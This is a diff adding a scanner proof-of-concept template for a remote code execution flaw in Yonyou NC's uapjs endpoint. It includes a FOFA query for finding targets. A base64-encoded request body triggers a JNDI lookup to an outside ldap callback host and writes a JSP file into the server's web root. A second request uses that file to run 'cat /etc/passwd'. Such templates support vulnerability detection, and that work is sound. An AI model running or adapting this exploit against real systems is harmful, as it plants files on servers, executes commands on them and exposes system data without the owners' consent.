@@ -1,0 +1,34 @@
+id: CNVD-C-2023-76801
+
+info:
+  name: 用友 Yonyou NC uapjs RCE
+  author: zan8in
+  severity: critical
+  verified: false
+  description: |
+    FOFA: app="用友-NC-Cloud"
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/131456781
+  tags: cnvd,cnvd2023,yonyou,nc
+  created: 2023/06/30
+
+set:
+  randstr: randomLowercase(10)
+  reverse: newJNDI()
+  jndiURL: reverse.url.host + reverse.url.path
+  body: base64Decode("eyJzZXJ2aWNlTmFtZSI6Im5jLml0Zi5pdWZvLklCYXNlU1BTZXJ2aWNlIiwibWV0aG9kTmFtZSI6InNhdmVYU3RyZWFtQ29uZmlnIiwicGFyYW1ldGVyVHlwZXMiOlsiamF2YS5sYW5nLk9iamVjdCIsImphdmEubGFuZy5TdHJpbmciXSwicGFyYW1ldGVycyI6WyIkeycnLmdldENsYXNzKCkuZm9yTmFtZSgnamF2YXgubmFtaW5nLkluaXRpYWxDb250ZXh0JykubmV3SW5zdGFuY2UoKS5sb29rdXAoJ2xkYXA6Ly97e2puZGlVUkx9fScpfSIsIndlYmFwcHMvbmNfd2ViL3t7cmFuZHN0cn19LmpzcCJdfQ==")
+rules:
+  r0:
+    request:
+      method: POST
+      path: /uapjs/jsinvoke/?action=invoke
+      body: "{{body}}"
+    expression: reverse.jndi(5)
+  r1:
+    request:
+      method: GET
+      path: /{{randstr}}.jsp
+      headers:
+        cmd: "cat+/etc/passwd"
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0() && r1()
